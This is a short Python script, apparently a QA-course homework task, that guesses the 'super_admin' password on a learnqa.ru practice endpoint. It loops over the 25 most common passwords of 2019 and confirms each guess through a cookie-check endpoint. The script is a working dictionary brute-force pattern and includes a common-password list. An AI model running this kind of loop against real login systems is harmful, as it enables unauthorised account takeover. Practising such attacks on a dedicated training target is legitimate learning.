import requests


passwords_top_25_2019 = \
    [
    "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
    "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
    "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"
    ]

url_login = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords_top_25_2019:
    # Отправляем запрос для получения cookie
    response_login = requests.post(url_login, data={"login": "super_admin", "password": password})

    # Получаем cookie из ответа
    auth_cookie = response_login.cookies.get("auth_cookie")

    # Проверяем cookie с помощью второго метода
    response_check = requests.get(url_check_auth, cookies={"auth_cookie": auth_cookie})

    # Если ответ "You are authorized", выводим пароль и сообщение
    if response_check.text == "You are authorized":
        print(f"Верный пароль: {password}")
        print(f"Ответ от сервера: {response_check.text}")
        break
else:
    print("Верный пароль не найден")
